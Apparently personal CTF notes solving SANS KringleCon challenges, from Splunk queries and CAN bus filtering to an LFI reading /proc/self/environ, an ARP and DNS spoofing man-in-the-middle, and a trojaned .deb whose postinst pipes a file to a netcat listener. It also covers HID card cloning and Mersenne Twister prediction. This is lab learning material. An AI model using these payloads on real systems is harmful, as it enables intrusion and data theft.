@@ -1,0 +1,113 @@
+Raw Notes
+# Operate the Santavator
+
+This one you just need to talk with Sparkle Redberry at the Santavator to get the key. Walk into the elevator and click the panel, you'll need to click the key on the bottom right. 
+Hopefully you've gotten the hex nut, red light, and green light. Use the hexnut to split the stream to get it to go to the red and green tubes, using the lights to change the color.
+
+##you'll also need the button from the locked room on the talk floor##
+
+# Open HID lock
+
+#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 -- shiny upatree
+
+lf search
+
+lf hid sim -r 2006e22f13 
+
+# Splunk Challenge
+
+	1) | tstats count where index=* by index | search index=T*-win OR T*-main| rex field=index "(?<technique>t\d+)[\.\-].0*" | stats dc(technique)
+	2) Expand on the 13 and look for the two that start with t1059.003
+	3) Follow the link to the atomic red github; go into the atomics and t1082 is for "information disclosure" look for machine guid
+	4) Index = attack -- then sort by the utc data, scroll to find the first one with OSTP in the test name
+	5) Frgnca made an audio codec; index=attack Technique=T1123 shows two events; used index=t1123* host="win-dc-748" EventCode=1 and saw there was nothing for 5 o'clock so went the 7:25:14 and recorded the first powershell entry
+	6) index=* *.bat -- searched all indexs for any .bat files then sorted by the filename, looked through the batch files on the github page until found one with regquery in it -- https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Misc/Discovery.bat 
+	7) index=* sourcetype=bro* sourcetype="bro:x509:json" -- look at the first one, get serial for the DC
+	8) The encrypted string is base64 encoded RC4; utilizing the key Stay Frosty
+
+# Solve the Sleighs CAN-D-BUS problem
+
+started by blocking all for 080, 188, 244, and 019 - this just left me with the 19B when I pushed lock/unlock - this would generate an extra message beyond the two we saw in the exercise from Wunorse.
+Now i removed my limiter for 080 and moved the sliders, I saw that the brake seemed to affect the number (hey we need to fix the brakes, lucky guess) so when I moved the break I first saw a number starting with all 0000 then a hex that appeared to match the number I had it set to, then three more that were FFFFFF and an another digit on the end (don't remember) -- I struggled to block these, but finally after trial an error landed on a block of Contains FF.
+
+Now I removed my 188 filter and moved the sliders around, nothing crazy numbers matched, finally removed the 019 filter, moved the sliders nothing crazy happened. and last I removed the 244 filter. boom!
+
+# Broken Tag Generator
+
+Looking at app you can upload an image, then it calls that image with an id= and random generated from the upload.
+
+The is an LFI in the id = 
+
+This lets you read the environment variables. id=../../../../proc/self/environ
+
+# ARP Shenanigans
+
+Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.
+
+The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.
+
+Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.
+
+The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file
+
+
+Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
+
+From <https://kringlecon.com/badge?section=objective&id=objARPMITM> 
+
+TCP dump shows us ARP request for who-has 10.6.6.53 tell 10.6.6.35
+
+Attacker box: 10.6.0.2 :: 02:42:0a:06:00:02
+10.6.0.3 :: 02:42:0a:06:00:03
+10.6.0.19 :: 02:42:0a:06:00:13
+
+Victim box: 10.6.6.35 :: 4c:24:57:ab:ed:84
+
+Gateway:: 10.6.0.1 :: 02:42:5e:f1:42:
+start http server in deb folder (python3 -m http.server 80) - run dns_resp.py and let run in one window, run arp_resp and you'll respond to the arp then the dns will catch the dns and redirect, then see the call from the server for
+
+GET /pub/jfrost/backdoor/suriv_amd64.deb
+
+##inside debs folder
+mkdir -p pub/jfrost/backdoor
+mkdir -p work/DEBIAN
+dpkg -x netcat*.deb work
+ar -x netcat*.deb
+tar -xvf control.tar.xz ./control
+tar -xvf control.tar.xz ./postinst
+
+mv control work/DEBIAN/
+mv postinst work/DEBIAN/
+
+echo "cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt | nc 10.6.0.3 1337" >> work/DEBIAN/postinst
+dpkg-deb --build work
+
+cp work.deb pub/jfrost/backdoor/suriv_amd64.deb
+Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
+
+# santavator
+
+{"type":"COMPLETE_CHALLENGE","resourceId":"ba9a09e1-18d3-4140-80b8-34b97ed964fb","hash":"33ae61de803b3c150b6175f34a2550256d3abffa9cf6cc0a8aaeb0c76a116f65","action":"goToFloor-3"}
+
+pick any floor, in the post change targetFloor to 3 and then in the websockt, change action to goToFloor-3
+
+# 11a 
+First when you run the check you'll see that the block is invalid, in looking it's b/c a straight copy of the verification doesn't have the previous hash, so set that outside of the for loop (it will get updated as the for loop goes through
+
+Now you can see all the way up to 12996; I noticed that the nonce was hes (64bit) but in my script when I called it I got a decimal number. Using the previous information on mt1993 we know we need to get two 32 bit numbers from here to use with the predictor:
+
+This gives us the 64 bit numbers, took this split script to get two 32 bit numbers and organize them  in the file:
+
+We save them with the lower part first then the upper to get them in the right order (hex being represented backwords).
+
+Then to test I took out the last 6 pairs of numbers and kept them to reference. 
+
+tail -n 624 first.txt > 624.txt
+cat 624.txt | mt19937predict > predict.txt (control c to see b/c it doesn't stop)
+Now head the file predict.txt confirm that the numbers match, so the last set gets you to 12996; so you need to get the 4th set of numbers and convert back to hex, I just manually did this:
+
+# 11b
+
+347979fece8d403e06f89f8633b5231a   b10b4a6bd373b61f32f4fd3a0cdfbf84   58a3b9335a6ceb0234c12d35a0564c4ef0e90152d0eb2ce2082383b38028a90f
+
+Chain Index: 129459
